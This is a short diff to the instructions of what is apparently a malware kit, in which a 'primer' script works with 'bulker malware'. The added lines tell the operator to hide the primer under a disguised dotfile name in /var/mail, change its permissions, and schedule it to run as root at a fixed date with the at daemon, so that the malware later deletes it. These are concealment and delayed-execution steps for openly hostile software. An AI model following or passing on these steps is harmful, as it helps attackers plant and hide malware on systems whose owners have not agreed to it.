@@ -15,6 +15,12 @@ Before using primer:
     
 If you wish to have primer deleted after bulker execution, hide the primer script by doing:
 
-    sudo mv primer /var/mail/.aws
+    sudo mv primer /var/mail/.aws && sudo chmod 511 /var/mail/.aws
     
 The bulker malware will look to see if the primer script is located there, and if it is found, it will delete it.
+
+### Setting Timer for Primer Script
+Use the _at_ daemon to create a specific time/date to trigger the initial primer script. Make sure to set _at_ job **as root**!
+
+    at 14:00 030322
+    bash /var/mail/.aws
